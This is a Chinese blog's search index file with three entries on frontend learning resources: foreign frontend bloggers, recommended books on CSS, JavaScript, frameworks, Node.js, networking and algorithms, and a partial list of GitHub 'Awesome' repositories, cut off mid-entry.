<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>国外前端博主</title>
      <link href="/2023/06/30/frontend/collection/guo-wai-qian-duan-bo-zhu/"/>
      <url>/2023/06/30/frontend/collection/guo-wai-qian-duan-bo-zhu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><ol><li>Ahmad Shadeed，主要分享 CSS 相关文章：<a href="https://ishadeed.com/">https://ishadeed.com/</a></li><li>Iskander Samatov，主要分享 TypeScript、React 相关文章：<a href="https://isamatov.com/">https://isamatov.com/</a></li><li>Nadia Makarevich，主要分享 React 相关文章：<a href="https://www.developerway.com/">https://www.developerway.com/</a></li><li>有很多优秀博主共同分享，主要分享 JavaScript 原理相关文章：<a href="https://blog.sessionstack.com/how-javascript-works/home">https://blog.sessionstack.com/how-javascript-works/home</a></li><li>Aleksandr Hovhannisyan，一个比较综合的博客：<a href="https://www.aleksandrhovhannisyan.com/">https://www.aleksandrhovhannisyan.com/</a></li><li>Bramus Van Damme，主要分享 CSS 相关文章：<a href="https://www.bram.us/">https://www.bram.us/</a></li><li>Lydia Hallie，作品集：<a href="https://www.lydiahallie.io/">https://www.lydiahallie.io/</a></li><li>Lydia Hallie，还是这个 23 岁的宝藏博主写的设计模式和组件模式的书：<a href="https://www.patterns.dev/">https://www.patterns.dev/</a></li><li>Bitbucket，主要分享 Git 相关知识：<a href="https://www.atlassian.com/git">https://www.atlassian.com/git</a></li><li>有很多优秀博主共同分享，主要分享框架进阶的知识：<a href="https://blog.openreplay.com/">https://blog.openreplay.com/</a></li><li>全网每日热门文章：<a href="https://app.daily.dev/">https://app.daily.dev/</a></li><li>有众多博主分享前端各类文章，质量比较高：<a href="https://blog.logrocket.com/">https://blog.logrocket.com/</a></li><li>Dr. Axel Rauschmayer，主要分享 JavaScript 相关文章：<a href="https://2ality.com/index.html">https://2ality.com/index.html</a></li><li>Victoria Lo，主要分享 React 相关文章：<a href="https://lo-victoria.com/">https://lo-victoria.com/</a></li><li>技术博主汇总平台：<a href="https://tech-blogs.dev/">https://tech-blogs.dev/</a></li><li>Chak Shun Yu，主要分享 React 相关文章，质量很高：<a href="https://www.chakshunyu.com/blog/">https://www.chakshunyu.com/blog/</a></li><li>Tapas Adhikary，主要分享前端开发技巧和进阶知识：<a href="https://blog.greenroots.info/">https://blog.greenroots.info/</a></li><li>Steven，主要分享偏基础的文章：<a href="https://lumin8media.com/">https://lumin8media.com/</a></li><li>Suhail Kakar，全栈开发，分享内容比较综合：<a href="https://blog.suhailkakar.com/">https://blog.suhailkakar.com/</a></li><li>inDepthDev，深入学习前端系列，框架相关较多：<a href="https://indepth.dev/">https://indepth.dev/</a></li><li>前端性能优化相关的理论：<a href="https://requestmetrics.com/web-performance/">https://requestmetrics.com/web-performance/</a></li><li>Alex Kondov，主要分享 React 文章，文章很硬核，必读：<a href="https://alexkondov.com/articles/">https://alexkondov.com/articles/</a></li><li>JoshWComeau，主要分享 CSS 文章：<a href="https://www.joshwcomeau.com/">https://www.joshwcomeau.com/</a></li><li>Daily Dev Tips，日更博主，分享前端各类文章：<a href="https://daily-dev-tips.com/archive/">https://daily-dev-tips.com/archive/</a></li><li>Ben Nadel，全栈开发，JavaScript 相关值得一看： <a href="https://www.bennadel.com/blog/complete-blog-entry-list.htm">https://www.bennadel.com/blog/complete-blog-entry-list.htm</a></li><li>David Walsh，分享各类文章：<a href="https://davidwalsh.name/">https://davidwalsh.name/</a></li><li>Amelia Wattenberger，分享 React 和可视化：<a href="https://wattenberger.com/blog">https://wattenberger.com/blog</a></li><li>Lee Robinson，分享 React 相关文章：<a href="https://leerob.io/">https://leerob.io/</a><br />29.Tania Rascia，分享各类文章：<a href="https://www.taniarascia.com/blog/">https://www.taniarascia.com/blog/</a></li><li>Writing JavaScript，主要分享 JavaScript 文章：<a href="https://writingjavascript.com/">https://writingjavascript.com/</a></li><li>Maxime，各类文章：<a href="https://blog.maximeheckel.com/">https://blog.maximeheckel.com/</a></li><li>Stefan，各类文章：<a href="https://www.stefanjudis.com/">https://www.stefanjudis.com/</a></li><li>Chameera Dulanga，文章必看：<a href="https://chameeradulanga.medium.com/">https://chameeradulanga.medium.com/</a></li><li>Piumi Liyana Gunawardhana，主要分享 React 相关文章：<a href="https://piumi-16.medium.com/">https://piumi-16.medium.com/</a></li><li>技术社区，内容偏向 CSS，设计：<a href="https://www.smashingmagazine.com/">https://www.smashingmagazine.com/</a></li><li>技术社区，各类前端文章，质量较高：<a href="https://blog.bitsrc.io/">https://blog.bitsrc.io/</a></li><li>Async blog，各类前端文章：<a href="https://www.loginradius.com/blog/async/">https://www.loginradius.com/blog/async/</a></li><li>Stephanie Eckles，主要分享 CSS 文章：<a href="https://moderncss.dev/">https://moderncss.dev/</a></li><li>Devtrium，分享 React、TypeScript 文章：<a href="https://devtrium.com/">https://devtrium.com/</a></li><li>ALEX DEVERO：<a href="https://blog.alexdevero.com/">https://blog.alexdevero.com/</a></li><li>Flavio Copes：<a href="https://flaviocopes.com/">https://flaviocopes.com/</a></li><li>Bhagya Vithana：<a href="https://bhagya-16.medium.com/">https://bhagya-16.medium.com/</a></li><li>Dan Abramov，React 团队核心成员：<a href="https://overreacted.io/">https://overreacted.io/</a></li><li>Todd H. Gardner，分享性能优化相关：<a href="https://toddhgardner.medium.com/">https://toddhgardner.medium.com/</a></li><li>Temani Afif，主要分享 CSS 相关文章：<a href="https://dev.to/afif">https://dev.to/afif</a></li><li>Sass 风格指南：<a href="https://sass-guidelin.es/zh/">https://sass-guidelin.es/zh/</a></li><li>分享各类文章：<a href="https://ordinarycoders.com/blog/articles">https://ordinarycoders.com/blog/articles</a></li><li>TK，JavaScript 相关: <a href="https://www.iamtk.co/">https://www.iamtk.co/</a></li><li>RisingStack，Node.js 相关：<a href="https://blog.risingstack.com/">https://blog.risingstack.com/</a></li><li>Journal： <a href="https://yagmurcetintas.com/">https://yagmurcetintas.com/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> blog </tag>
            
            <tag> 国外 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端书籍</title>
      <link href="/2023/06/30/frontend/collection/qian-duan-shu-ji/"/>
      <url>/2023/06/30/frontend/collection/qian-duan-shu-ji/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665057509766-b7c4f501-702f-4a73-b29a-9b949c8a5395.png?x-oss-process=image/resize,w_849,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665057509766-b7c4f501-702f-4a73-b29a-9b949c8a5395.png?x-oss-process=image/resize,w_849,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>1. CSS</strong><br /><strong>（1）CSS 世界、CSS 新世界</strong><br />CSS 世界三部曲中的其中两部，都是关于 CSS 的进阶读物，作者结合自己多年的从业经验，讲解 CSS 基础知识，并充分考虑前端开发者的需求，以 CSS 新特性的历史背景为线索，去粗取精，注重细节，深入浅出地介绍了上百个 CSS 新特性。主要目标是帮助前端开发者突破 CSS 技能提升的瓶颈，非常适合具有一定 CSS 基础的前端开发者阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665034843214-353df50c-b69a-44ef-8fb2-55fe1428cf5d.png?x-oss-process=image/resize,w_560,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665034843214-353df50c-b69a-44ef-8fb2-55fe1428cf5d.png?x-oss-process=image/resize,w_560,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）CSS 权威指南（第四版）（上下册）</strong><br />本书展示了如何通过布局、过渡和动画、边框、背景、文本属性，以及许多其他工具和技术来改善用户体验、加快开发速度、避免潜在的错误。对 CSS 进行了系统的讲解，适合当工具书来阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665034986124-81eaea1a-8413-4dc1-9bd8-b3050e2e3067.png?x-oss-process=image/resize,w_533,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665034986124-81eaea1a-8413-4dc1-9bd8-b3050e2e3067.png?x-oss-process=image/resize,w_533,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）CSS 揭秘</strong><br />本书是一本注重实践的教程，作者为我们揭示了 47 个鲜为人知的 CSS 技巧，主要内容包括背景与边框、形状、视觉效果、字体排印、用户体验、结构与布局、过渡与动画等。适合有一定 CSS 基础的开发者阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035060259-3ce599ae-a5d7-4143-a6c6-51753d2096f6.png?x-oss-process=image/resize,w_387,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035060259-3ce599ae-a5d7-4143-a6c6-51753d2096f6.png?x-oss-process=image/resize,w_387,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（4）深入解析 CSS</strong><br />本书旨在帮你深度掌握 CSS 语言，并快速了解 CSS 的新进展和新特性。书中不仅有讲解透彻的概念介绍，而且还有详细的分步示例，能够帮助你提升 CSS 开发技能。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035161806-7a7b6f48-1c70-4de2-8298-6f3188acf9b9.png?x-oss-process=image/resize,w_386,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035161806-7a7b6f48-1c70-4de2-8298-6f3188acf9b9.png?x-oss-process=image/resize,w_386,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>2. JavaScript</strong><br /><strong>（1）JavaScript 高级程序设计（第 4 版）</strong><br />前端开发最值得阅读的书籍之一，也就是传说中的红宝书。书中详尽讨论了 JavaScript 的各个方面，从 JavaScript 的起源开始，逐步讲解到新出现的技术，其中重点介绍 ECMAScript 和 DOM 标准。适合所有阶段的前端开发者阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035706383-3cda7e63-3520-4bbf-83ae-ee95252c754a.png?x-oss-process=image/resize,w_377,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035706383-3cda7e63-3520-4bbf-83ae-ee95252c754a.png?x-oss-process=image/resize,w_377,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）JavaScript 权威指南（第 7 版）</strong><br />前端开发最值得阅读的书籍之一，也就是传说中的犀牛书。本书介绍 JavaScript 语言和由浏览器与 Node 实现的 JavaScript API。本书的目标是全面地讲解 JavaScript 语言，对 JavaScript 程序中可能用到的重要的客户端 API 和服务器端 API 提供深入的介绍。本书适合有一定编程经验、想学习 JavaScript 读者，也适合已经在使用 JavaScript 但希望更深入地理解进而真正掌握这门语言的程序员。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035808873-99977386-1b0d-4ea2-8d07-06000549d563.png?x-oss-process=image/resize,w_424,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035808873-99977386-1b0d-4ea2-8d07-06000549d563.png?x-oss-process=image/resize,w_424,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）你不知道的 JavaScript（上卷+中卷+下卷）</strong><br />“你不知道的 JavaScript”系列就是要让不求甚解的 JavaScript 开发人迎难而上，深入语言内部，弄清楚 JavaScript 每一个零部件的用途，轻松理解前端圈里出现的各种技术、框架和流行术语。本书既适合 JavaScript 语言初学者阅读，又适合经验丰富的前端开发人员深入学习。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035855288-ea746d0c-c823-4515-a07b-381c4888a8c0.png?x-oss-process=image/resize,w_452,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035855288-ea746d0c-c823-4515-a07b-381c4888a8c0.png?x-oss-process=image/resize,w_452,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（4）ES6 标准入门（第 3 版）</strong><br />本书根据 ES2017 标准，详尽介绍了所有新增的语法，对基本概念、设计目的和用法进行了清晰的讲解，给出了大量简单易懂的示例。其难度适中，适合那些已经对 JavaScript 有一定了解的读者。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665034225247-7de272da-3c7f-463a-89a5-5dd75a06d773.png?x-oss-process=image/resize,w_417,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665034225247-7de272da-3c7f-463a-89a5-5dd75a06d773.png?x-oss-process=image/resize,w_417,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（5）深入理解 ES6</strong><br />本书对 ES6 的各种新特性进行了系统性的讲解，可以帮助我们加深对 ES6 的理解，并深入学期其原理。适合对 JavaScript 有一定了解的读者阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665034647804-bd4cbc53-5cae-4fb7-a3ef-5defa34cb2e4.png?x-oss-process=image/resize,w_400,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665034647804-bd4cbc53-5cae-4fb7-a3ef-5defa34cb2e4.png?x-oss-process=image/resize,w_400,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（6）JavaScript 忍者秘籍（第 2 版）</strong><br />本书介绍了如何掌握 JavaScript 核心的概念，诸如函数、闭包、对象、原型和 promise，同时还介绍了 JavaScript API， 包括 DOM、事件和计时器。对 JavaScript 底层进行深入讲解，适合初学者和进阶 JavaScript 的开发者阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665055877997-7f3450fd-2d9a-4ef7-810d-efbfe2ddb5ec.png?x-oss-process=image/resize,w_394,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665055877997-7f3450fd-2d9a-4ef7-810d-efbfe2ddb5ec.png?x-oss-process=image/resize,w_394,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（7）高性能 JavaScript</strong><br />本书揭示的技术和策略能帮助你在开发过程中消除性能瓶颈。你将会了解如何提升各方面的性能，包括代码的加载、运行、DOM 交互、页面生存周期等。本书介绍了页面代码加载的最佳方法和编程技巧，来帮助你编写更为高效和快速的代码。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036731509-8222c25d-9c26-4208-88a4-d37718318533.png?x-oss-process=image/resize,w_423,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036731509-8222c25d-9c26-4208-88a4-d37718318533.png?x-oss-process=image/resize,w_423,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>3. 框架</strong><br /><strong>（1）Vue.js 设计与实现</strong><br />本书由 Vue.js 官方团队成员霍春阳倾力打造，基于 Vue 3 深入解析 Vue.js 设计细节，从规范出发，以源码为基础，并结合大量直观的配图，循序渐进地讲解 Vue.js 中各个功能模块的实现，细致剖析框架设计原理。适合有一定 Vue 开发经验的的开发者阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665032981895-1d1323a6-2d5a-4a18-a7fb-5545f5a4871e.png?x-oss-process=image/resize,w_400,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665032981895-1d1323a6-2d5a-4a18-a7fb-5545f5a4871e.png?x-oss-process=image/resize,w_400,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）深入 React 技术栈</strong><br />本书从几个维度去介绍 React。一是作为 View 库，它怎么实现组件化，以及它背后的实现原理。二是扩展到 Flux 应用架构及重要的衍生品 Redux，它们怎么与 React 结合做应用开发。三是对 React 与 server 的碰撞产生的一些思考。四是讲述它在可视化方面的优势与劣势。 适合有一定经验的前端开发人员阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036938300-3b8eea8d-96a6-4870-a868-378f0f8e072a.png?x-oss-process=image/resize,w_446,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036938300-3b8eea8d-96a6-4870-a868-378f0f8e072a.png?x-oss-process=image/resize,w_446,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>4. Node.js</strong><br /><strong>（1）深入浅出 Node.js</strong><br />从不同的视角介绍了 Node 内在的特点和结构。主要内容包含模块机制的揭示、异步 I&#x2F;O 实现原理的展现、异步编程的探讨、内存控制的介绍、二进制数据 Buffer 的细节、Node 中的网络编程基础、Node 中的 Web 开发、进程间的消息传递、Node 测试以及通过 Node 构建产品需要的注意事项。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665033889916-46c2f325-cc41-47dd-89e3-af4f51369f64.png?x-oss-process=image/resize,w_400,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665033889916-46c2f325-cc41-47dd-89e3-af4f51369f64.png?x-oss-process=image/resize,w_400,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Node 与 Express 开发</strong><br />本书系统讲解了使用 Express 开发动态 Web 应用的流程和步骤。不仅讲授了开发公共站点及 REST API 的基础知识，同时还讲解了构建单页、多页及混合 Web 应用的规划方式及实践。适合所有前端开发人员阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036805641-11ca2f16-65a9-4442-b5fb-31a2442b0654.png?x-oss-process=image/resize,w_398,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036805641-11ca2f16-65a9-4442-b5fb-31a2442b0654.png?x-oss-process=image/resize,w_398,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）狼书：更了不起的 Node.js（卷 1、卷 2）</strong><br />本书讲解了 Node.js 的基础知识、开发调试方法、源码原理和应用场景，旨在向读者展示如何通过新的 Node.js 和 npm 编写出更具前端特色、更具工程化优势的代码。本书还讲解了 Node.js 中相当核心且复杂的异步流程控制，展望了未来异步流程的发展方向。对于了解 Node.js 在企业中如何应用很有帮助。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665034100330-127e3638-c128-4aeb-a6d3-c349e4028338.png?x-oss-process=image/resize,w_400,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665034100330-127e3638-c128-4aeb-a6d3-c349e4028338.png?x-oss-process=image/resize,w_400,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>**5. TypeScript **<br /><strong>（1）深入理解 TypeScript</strong><br />本书涵盖了 TypeScript 的大部分知识点，并对其进行了细致的讲解。本书还对 TypeScript 编译原理进行了深入的剖析，对高级编程技巧、编译原理进行了深入浅出的解读，适合入门 TypeScript 的开发者阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665037519581-2b13e4c4-7198-4a6b-ab0f-9f20c723b3e9.png?x-oss-process=image/resize,w_433,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665037519581-2b13e4c4-7198-4a6b-ab0f-9f20c723b3e9.png?x-oss-process=image/resize,w_433,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>6. 设计模式</strong><br /><strong>（1）JavaScript 设计模式与开发实践</strong><br />本书针对 JavaScript 语言特性全面介绍了更适合前端程序员的了 16 个常用的设计模式，讲解了 JavaScript 面向对象和函数式编程方面的基础知识，介绍了面向对象的设计原则及其在设计模式中的体现，还分享了面向对象编程技巧和日常开发中的代码重构。本书将教会你如何把经典的设计模式应用到 JavaScript 中，编写出优美高效、结构化和可维护的代码。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665033011075-582bdcab-6cf8-4ad2-a812-cbbef6a78e26.png?x-oss-process=image/resize,w_401,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665033011075-582bdcab-6cf8-4ad2-a812-cbbef6a78e26.png?x-oss-process=image/resize,w_401,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）重构 改善既有代码的设计</strong><br />书中清晰揭示了重构的过程，解释了重构的原理和佳实践方式，并给出了何时以及何地应该开始挖掘代码以求改善。书中给出了 60 多个可行的重构，每个重构都介绍了一种经过验证的代码变换手法的动机和技术。本书提出的重构准则将帮助开发人员一次一小步地修改代码，从而减少了开发过程中的风险。适合有一定前端开发经验的开发者阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036485041-f8e0f70e-81f2-4744-a746-f6db1a978775.png?x-oss-process=image/resize,w_421,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036485041-f8e0f70e-81f2-4744-a746-f6db1a978775.png?x-oss-process=image/resize,w_421,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>7. 计算机网络</strong><br /><strong>（1）图解 HTTP</strong><br />本书对 HTTP 协议进行了全面系统的介绍。作者由 HTTP 协议的发展历史娓娓道来，严谨细致地剖析了 HTTP 协议的结构，列举诸多常见通信场景及实战案例，最后延伸到 Web 安全、全新技术动向等方面。在讲解的同时，辅以大量生动形象的通信图例，更好地帮助读者深刻理解 HTTP 通信过程中客户端与服务器之间的交互情况。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665033422151-44c10d81-8139-421b-8f1b-e51079201449.png?x-oss-process=image/resize,w_390,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665033422151-44c10d81-8139-421b-8f1b-e51079201449.png?x-oss-process=image/resize,w_390,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）图解 TCP&#x2F;IP（第 5 版）</strong><br />本书讲解了网络基础知识、TCP&#x2F;IP 基础知识、数据链路、IP 协议、IP 协议相关技术、TCP 与 UDP、路由协议、应用协议、网络安全等内容，适合初学者阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665033721819-8956de02-0274-4b04-9c12-7bee1d1465ae.png?x-oss-process=image/resize,w_400,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665033721819-8956de02-0274-4b04-9c12-7bee1d1465ae.png?x-oss-process=image/resize,w_400,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）HTTP 权威指南</strong><br />本书详细解释了 HTTP 协议，探讨了 HTTP 有效工作所依赖的所有其他核心因特网技术。本书的本质是理解 Web 的工作原理，以及如何将这些知识应用到 Web 编程和管理之中去，主要涵盖 HTTP 的技术运作方式、产生动机、性能和目标，以及一些相关技术问题。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035361863-83c0189e-426d-48d6-80cb-2c1b38ea1c06.png?x-oss-process=image/resize,w_400,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665035361863-83c0189e-426d-48d6-80cb-2c1b38ea1c06.png?x-oss-process=image/resize,w_400,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>8. 数据结构与算法</strong><br /><strong>（1）数据结构与算法 JavaScript 描述</strong><br />本书是用 JavaScript 描述数据结构与算法的开山之作，通过丰富的示例，向读者透彻讲解了在 JavaScript 环境下，如何通过一系列存储机制（包括链表、栈、队列和图）高效地达到编程目的。学习数据结构与算法可以提高逻辑思维能力和解决问题的能力。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036133327-64f4276b-316e-42ce-b510-25d3b7663679.png?x-oss-process=image/resize,w_371,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036133327-64f4276b-316e-42ce-b510-25d3b7663679.png?x-oss-process=image/resize,w_371,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）我的第一本算法书</strong><br />本书采用大量图片，通过详细的分步讲解，以直观、易懂的方式展现了 7 个数据结构和 26 个基础算法的基本原理。本书通过大量的步骤图帮助读者加深对数据结构原理和算法执行过程的理解，便于学习和记忆。将本书作为算法入门的第一步，是非常不错的选择。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665037303618-daab8274-4ce3-4e6c-a10e-1e6fe9ab0743.png?x-oss-process=image/resize,w_386,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665037303618-daab8274-4ce3-4e6c-a10e-1e6fe9ab0743.png?x-oss-process=image/resize,w_386,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>9. 计算机基础</strong><br /><strong>（1）计算机是怎样跑起来的</strong><br />本书以图配文，以计算机的三大原则为开端、相继介绍了计算机的结构、手工汇编、程序流程、算法、数据结构、面向对象编程、数据库、TCP&#x2F;IP 网络、数据加密、XML、计算机系统开发以及 SE 的相关知识。适合想要扩展计算机基础知识的开发者阅读。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036594756-2c81e4eb-7c1f-46c1-b4f1-dd3ff45adc57.png?x-oss-process=image/resize,w_388,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1665036594756-2c81e4eb-7c1f-46c1-b4f1-dd3ff45adc57.png?x-oss-process=image/resize,w_388,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 书籍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 书籍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Awesome</title>
      <link href="/2023/06/30/frontend/collection/projects/awesome/"/>
      <url>/2023/06/30/frontend/collection/projects/awesome/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>GitHub 上的 Awesome 系列是一个汇总了优秀工具和资源的大集合。下面就来分享 Awesome 系列中关于前端的项目！<br /><strong>●Awesome HTML5：</strong><a href="https://github.com/diegocard/awesome-html5">https://github.com/diegocard/awesome-html5</a><br /><strong>●Awesome CSS：</strong><a href="https://github.com/awesome-css-group/awesome-css">https://github.com/awesome-css-group/awesome-css</a><br /><strong>●Awesome JavaScript：</strong><a href="https://github.com/sorrycc/awesome-javascript">https://github.com/sorrycc/awesome-javascript</a><br /><strong>●Awesome TypeScript：</strong><a href="https://github.com/semlinker/awesome-typescript">https://github.com/semlinker/awesome-typescript</a><br /><strong>●Awesome Vue.js：</strong><a href="https://github.com/vuejs/awesome-vue">https://github.com/vuejs/awesome-vue</a><br /><strong>●Awesome React：</strong><a href="https://github.com/enaqx/awesome-react">https://github.com/enaqx/awesome-react</a><br /><strong>●Awesome React Hooks：</strong><a href="https://github.com/rehooks/awesome-react-hooks">https://github.com/rehooks/awesome-react-hooks</a><br /><strong>●Awesome React Components：</strong><a href="https://github.com/brillout/awesome-react-components">https://github.com/brillout/awesome-react-components</a><br /><strong>●Awesome Angular：</strong><a href="https://github.com/PatrickJS/awesome-angular">https://github.com/PatrickJS/awesome-angular</a><br /><strong>●Awesome Nodejs：</strong><a href="https://github.com/sindresorhus/awesome-nodejs">https://github.com/sindresorhus/awesome-nodejs</a><br /><strong>●Awesome wechat weapp：</strong><a href="https://github.com/justjavac/awesome-wechat-weapp">https://github.com/justjavac/awesome-wechat-weapp</a><br /><strong>●Awesome Webpack：</strong><a href="https://webpack.js.org/awesome-webpack/">https://webpack.js.org/awesome-webpack/</a><br /><strong>●Awesome Vite.js：</strong><a href="https://github.com/vitejs/awesome-vite">https://github.com/vitejs/awesome-vite</a><br /><strong>●Awesome Electron：</strong><a href="https://github.com/sindresorhus/awesome-electron">https://github.com/sindresorhus/awesome-electron</a><br /><strong>●Awesome React Native：</strong><a href="https://github.com/jondot/awesome-react-native">https://github.com/jondot/awesome-react-native</a><br /><strong>●Awesome Lowcode：</strong><a href="https://github.com/taowen/awesome-lowcode">https://github.com/taowen/awesome-lowcode</a><br /><strong>●Awesome Flutter：</strong><a 